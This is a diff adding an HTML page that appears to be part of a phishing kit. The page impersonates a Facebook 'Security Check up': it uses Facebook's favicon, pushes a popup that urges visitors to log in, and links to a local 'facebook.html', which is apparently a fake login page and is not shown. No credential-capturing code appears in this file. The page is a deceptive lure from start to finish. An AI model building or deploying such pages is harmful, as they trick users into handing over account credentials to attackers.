@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" />
+    <style>
+        .container{
+            text-align: center;
+            color: rgb(24, 119, 242);
+            font-size: 25px;
+            margin-top: 100px;
+        }
+        .text{
+            text-align: center;
+            color: rgb(24, 119, 242);
+            font-size: 30px;
+        }
+        #ac-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, .6);
+            z-index: 1001;
+            /* display: none; */
+        }
+
+        #popup {
+            width: 200px;
+            height: 150px;
+            background: linear-gradient(#0361ee, white);
+            border: 5px solid #3871c5;
+            border-radius: 25px;
+            -moz-border-radius: 25px;
+            -webkit-border-radius: 25px;
+            box-shadow: #64686e 0px 0px 3px 3px;
+            -moz-box-shadow: #64686e 0px 0px 3px 3px;
+            -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+            position: relative;
+            top: 150px;
+            left: 75px;
+            opacity: .9;
+        }
+
+        .color {
+            color: white;
+            font-size: 15px;
+        }
+
+        center {
+            /* position: fixed;
+    top: 50%;
+    left: 50%; */
+            padding-top: 30px;
+
+        }
+        .btn{
+                background: linear-gradient(120deg, rgba(24, 53, 184, 0.753), white);
+                color: white;
+            }
+        
+        @media screen and (min-width: 767px){
+            img{
+                width: 400px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                /* position: absolute*/
+                margin-left: auto;
+                margin-right: auto;
+                
+                
+            }
+            .container{
+                margin-top: 200px;
+            }
+            #ac-wrapper {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(255, 255, 255, .6);
+                z-index: 1001;
+            }
+
+            #popup {
+                width: 400px;
+                height: 250px;
+                background: linear-gradient(#0361ee, white);
+                border: 5px solid #3871c5;
+                border-radius: 25px;
+                -moz-border-radius: 25px;
+                -webkit-border-radius: 25px;
+                box-shadow: #64686e 0px 0px 3px 3px;
+                -moz-box-shadow: #64686e 0px 0px 3px 3px;
+                -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+                position: relative;
+                top: 150px;
+                left: 150px;
+                opacity: .9;
+            }
+
+            .color {
+                color: white;
+            }
+
+            center {
+                /* position: fixed;
+    top: 50%;
+    left: 50%; */
+                padding-top: 50px;
+
+            }
+            
+            .btn{
+                background: linear-gradient(120deg, rgba(24, 53, 184, 0.753), white);
+                
+            }
+        }
+        @media screen and (min-width: 1200px) {
+            #ac-wrapper {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(255,255,255,.6);
+    z-index: 1001;
+    display: none;
+}
+
+#popup {
+    width: 355px;
+    height: 200px;
+    background: linear-gradient(#0361ee, white);
+    border: 5px solid #3871c5;
+    border-radius: 25px;
+    -moz-border-radius: 25px;
+    -webkit-border-radius: 25px;
+    box-shadow: #64686e 0px 0px 3px 3px;
+    -moz-box-shadow: #64686e 0px 0px 3px 3px;
+    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    position: relative;
+    top: 150px; left: 475px;
+    opacity: .9;
+}  
+.color {
+            font-size: 25px;
+                color: white;
+            }
+
+            center {
+                /* position: fixed;
+    top: 50%;
+    left: 50%; */
+                padding-top: 50px;
+
+            }
+            
+            .btn{
+                background: linear-gradient(120deg, rgba(24, 53, 184, 0.753), white);
+                
+            }
+        }
+        
+        
+    </style>
+    <title>Security Check up</title>
+    
+</head>
+<body>
+    <div id="ac-wrapper">
+        <div id="popup">
+            <center>
+                <h2 class="color">For keeping with you in touch </h2>
+                <p class="color">please login and have fun</p>
+                <button class ="btn"type="submit" name="submit" value="Ok" onClick="PopUp()">
+                    Ok
+                </button>
+            </center>
+        </div>
+    </div>
+    <p class="container">For Security Reason Log in <br></p>
+    <p class="text">With</p>
+  <a href="facebook.html"> <img src="facebook.svg" alt="facebook-icon" class="stl"></a>
+  <script>
+      
+      window.onload = setTimeout(function(){
+        document.getElementById('ac-wrapper').style.display="flex"; 
+      }, 2000)
+      
+    function PopUp(){
+  document.getElementById('ac-wrapper').style.display="none"; 
+}
+let item = document.getElementById("ac-wrapper")
+//  setTimeout(
+//      function hlw(){
+//          item.style.display!="none";
+//      },2000
+//  )
+  </script>
+  
+</body>
+</html>
